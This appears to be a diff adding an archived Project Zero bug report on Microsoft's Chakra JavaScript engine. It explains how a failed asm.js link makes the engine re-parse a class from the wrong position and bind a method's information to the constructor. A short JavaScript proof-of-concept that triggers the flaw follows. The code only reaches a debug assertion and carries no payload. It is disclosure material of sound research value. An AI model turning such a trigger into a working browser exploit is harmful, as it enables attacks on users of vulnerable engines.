@@ -1,0 +1,48 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1271
+
+When Chakra fails to link an asmjs module, it tries to re-parse the failed-to-link asmjs function to treat it as a normal javascript function. But it incorrectly handles the case where the function is a class. It starts to parse from the start of the class declaration instead of the constructor. So it may result in binding incorrect information to the constructor. In the PoC, it binds the information of the method "f"("f2" in the latest release version of Edge) to the constructor.
+
+The PoC hits the following assertion in the debug build.
+FuncInfo * ByteCodeGenerator::StartBindFunction(const char16 *name, uint nameLength, uint shortNameOffset, bool* pfuncExprWithName, ParseNode *pnode, Js::ParseableFunctionInfo * reuseNestedFunc)
+{
+    bool funcExprWithName;
+    Js::ParseableFunctionInfo* parseableFunctionInfo = nullptr;
+
+    Js::AutoRestoreFunctionInfo autoRestoreFunctionInfo(reuseNestedFunc, reuseNestedFunc ? reuseNestedFunc->GetOriginalEntryPoint() : nullptr);
+    
+    if (this->pCurrentFunction &&
+        this->pCurrentFunction->IsFunctionParsed())
+    {
+        Assert(this->pCurrentFunction->StartInDocument() == pnode->ichMin); <<------- here
+        ...
+    }
+    ...
+}
+
+"this->pCurrentFunction" is the consturctor, but "pnode" refers to the method "f".
+
+
+PoC:
+-->
+
+class MyClass {
+    f(a) {
+        print(a);
+    }
+
+    constructor() {
+        'use asm';
+        function f(v) {
+            v = v | 0;
+            return v | 0;
+        }
+        return f;
+    }
+
+    f2(a) {
+        print(a);
+    }
+}
+
+MyClass(1);
